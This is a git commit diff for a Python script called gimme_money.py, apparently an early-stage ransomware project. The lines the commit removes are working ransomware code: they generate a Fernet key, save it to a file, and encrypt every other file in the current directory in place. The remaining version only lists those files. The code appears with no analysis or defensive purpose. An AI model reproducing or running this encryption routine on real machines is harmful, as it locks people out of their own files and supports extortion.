95d00ed6d405763fb2d6d344088aa94b9f85c976
tanmay8146 <rv3nom@outlook.com>
2023-01-18 23:42:12 +0530

    added key file

--- gimme_money.py
+++ gimme_money.py
@@ -5,23 +5,9 @@ from cryptography.fernet import Fernet
 files= []
 
 for file in os.listdir():
-    if file == 'gimme_money.py' or file == 'key.txd':
+    if file == 'gimme_money.py' or file == 'key.key':
         continue
     if os.path.isfile(file):
         files.append(file)
 
-# print(files)
-
-KEY = Fernet.generate_key()
-# print(KEY)
-
-with open("key.txd", "wb") as thekey:
-    thekey.write(KEY)
-
-for file in files:
-    with open(file, "rb") as thefile:
-        contents = thefile.read()
-    content_encr = Fernet(KEY).encrypt(contents)
-    with open(file, "wb") as thefile:
-        thefile.write(content_encr)
-        
+print(files)
